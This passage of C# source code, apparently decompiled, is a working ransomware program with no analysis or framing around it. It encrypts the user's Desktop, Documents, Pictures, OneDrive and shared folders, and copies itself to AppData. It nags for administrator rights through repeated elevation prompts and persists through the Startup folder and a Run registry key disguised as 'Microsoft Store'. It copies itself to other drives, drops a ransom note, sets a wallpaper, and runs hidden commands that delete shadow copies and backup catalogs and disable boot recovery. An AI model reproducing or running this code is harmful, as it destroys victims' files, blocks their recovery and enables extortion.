		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
